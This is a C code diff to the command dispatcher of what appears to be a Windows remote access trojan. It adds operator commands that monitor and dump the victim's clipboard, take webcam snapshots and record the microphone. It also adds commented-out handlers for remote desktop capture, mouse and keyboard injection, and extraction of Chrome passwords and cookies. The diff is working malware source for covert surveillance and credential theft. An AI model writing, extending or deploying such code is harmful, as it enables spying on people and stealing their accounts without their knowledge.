@@ -15,6 +15,11 @@
 #include "handlers/token.h"
 #include "../../include/surveillance/screenshot.h"
 #include "../../include/surveillance/keylogger.h"
+#include "../../include/surveillance/clipboard.h"
+#include "../../include/surveillance/webcam.h"
+#include "../../include/surveillance/microphone.h"
+#include "../../include/remote/desktop.h"
+#include "../../include/credentials/browser.h"
 
 /* ============================================================================
  * Parser JSON minimal
@@ -150,6 +155,26 @@ static command_type_t string_to_command(const char *cmd) {
     return CMD_KEYLOG_STOP;
   if (str_icmp(cmd, "keylog_dump") == 0)
     return CMD_KEYLOG_DUMP;
+  if (str_icmp(cmd, "clipboard_start") == 0)
+    return CMD_CLIPBOARD_START;
+  if (str_icmp(cmd, "clipboard_stop") == 0)
+    return CMD_CLIPBOARD_STOP;
+  if (str_icmp(cmd, "clipboard_dump") == 0)
+    return CMD_CLIPBOARD_DUMP;
+  if (str_icmp(cmd, "webcam_snap") == 0)
+    return CMD_WEBCAM_SNAP;
+  if (str_icmp(cmd, "mic_record") == 0)
+    return CMD_MIC_RECORD;
+  if (str_icmp(cmd, "desktop_capture") == 0)
+    return CMD_DESKTOP_CAPTURE;
+  if (str_icmp(cmd, "desktop_mouse") == 0)
+    return CMD_DESKTOP_MOUSE;
+  if (str_icmp(cmd, "desktop_key") == 0)
+    return CMD_DESKTOP_KEY;
+  if (str_icmp(cmd, "browser_creds") == 0)
+    return CMD_BROWSER_CREDS;
+  if (str_icmp(cmd, "browser_cookies") == 0)
+    return CMD_BROWSER_COOKIES;
 
   return CMD_NONE;
 }
@@ -393,7 +418,190 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
         status = STATUS_FAILURE;
       }
     }
+
     break;
+
+  case CMD_CLIPBOARD_START:
+    if (Clipboard_IsRunning()) {
+      result->output = str_dup("Clipboard monitor already running");
+      status = STATUS_SUCCESS;
+    } else if (Clipboard_Start()) {
+      result->output = str_dup("Clipboard monitor started");
+      status = STATUS_SUCCESS;
+    } else {
+      result->output = str_dup("Failed to start clipboard monitor");
+      status = STATUS_FAILURE;
+    }
+    result->output_len = result->output ? strlen(result->output) : 0;
+    break;
+
+  case CMD_CLIPBOARD_STOP:
+    Clipboard_Stop();
+    result->output = str_dup("Clipboard monitor stopped");
+    result->output_len = result->output ? strlen(result->output) : 0;
+    status = STATUS_SUCCESS;
+    break;
+
+  case CMD_CLIPBOARD_DUMP:
+    {
+      char* clip_data = NULL;
+      DWORD clip_size = 0;
+      if (Clipboard_GetBuffer(&clip_data, &clip_size)) {
+        if (clip_data && clip_size > 0) {
+          result->output = clip_data; // Transfer ownership
+          result->output_len = clip_size;
+        } else {
+          result->output = str_dup("No clipboard data captured");
+          result->output_len = result->output ? strlen(result->output) : 0;
+        }
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to get clipboard buffer");
+        result->output_len = result->output ? strlen(result->output) : 0;
+        status = STATUS_FAILURE;
+      }
+    }
+    break;
+
+  case CMD_WEBCAM_SNAP:
+    {
+      BYTE* webcam_data = NULL;
+      DWORD webcam_size = 0;
+      if (Webcam_CaptureSnapshot(&webcam_data, &webcam_size)) {
+        result->data = webcam_data;
+        result->data_len = webcam_size;
+        result->output = str_dup("Webcam snapshot captured");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to capture webcam (no camera?)");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_MIC_RECORD:
+    {
+      int seconds = 5; // Défaut
+      if (task->args && strlen(task->args) > 0) {
+          seconds = str_to_int(task->args);
+      }
+      if (seconds <= 0) seconds = 5;
+
+      BYTE* audio_data = NULL;
+      DWORD audio_size = 0;
+      audio_data = Microphone_Record(seconds, &audio_size);
+      
+      if (audio_data && audio_size > 0) {
+        result->data = audio_data;
+        result->data_len = audio_size;
+        result->output = str_dup("Audio recording captured");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to record audio (no mic or error)");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+/*
+  case CMD_DESKTOP_CAPTURE:
+    {
+      int quality = 50; // Défaut
+      if (task->args && strlen(task->args) > 0) {
+        quality = str_to_int(task->args);
+        if (quality <= 0 || quality > 100) quality = 50;
+      }
+      BYTE* frame_data = NULL;
+      DWORD frame_size = 0;
+      if (Desktop_CaptureScreen(&frame_data, &frame_size, quality)) {
+        result->data = frame_data;
+        result->data_len = frame_size;
+        result->output = str_dup("Desktop frame captured");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to capture desktop");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+*/
+
+/*
+  case CMD_DESKTOP_MOUSE:
+    {
+      // Format args: "x,y,flags"
+      int x = 0, y = 0;
+      DWORD flags = 0;
+      if (task->args) {
+        sscanf(task->args, "%d,%d,%lu", &x, &y, &flags);
+      }
+      if (Desktop_InjectMouse(x, y, flags)) {
+        result->output = str_dup("Mouse event injected");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to inject mouse event");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_DESKTOP_KEY:
+    {
+      // Format args: "vk,up" (vk = virtual key code, up = 0 or 1)
+      WORD vk = 0;
+      int up = 0;
+      if (task->args) {
+        sscanf(task->args, "%hu,%d", &vk, &up);
+      }
+      if (Desktop_InjectKey(vk, up != 0)) {
+        result->output = str_dup("Key event injected");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to inject key event");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+*/
+
+/*
+  case CMD_BROWSER_CREDS:
+    {
+      char* creds_json = NULL;
+      if (Browser_GetChromePasswords(&creds_json)) {
+        result->output = creds_json;
+        result->output_len = creds_json ? strlen(creds_json) : 0;
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to extract browser credentials");
+        result->output_len = result->output ? strlen(result->output) : 0;
+        status = STATUS_FAILURE;
+      }
+    }
+    break;
+*/
+
+/*
+  case CMD_BROWSER_COOKIES:
+    {
+      char* cookies_json = NULL;
+      if (Browser_GetChromeCookies(&cookies_json)) {
+        result->output = cookies_json;
+        result->output_len = cookies_json ? strlen(cookies_json) : 0;
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to extract browser cookies");
+        result->output_len = result->output ? strlen(result->output) : 0;
+        status = STATUS_FAILURE;
+      }
+    }
+    break;
+*/
 
   default:
     result->output = str_dup("Unknown command");
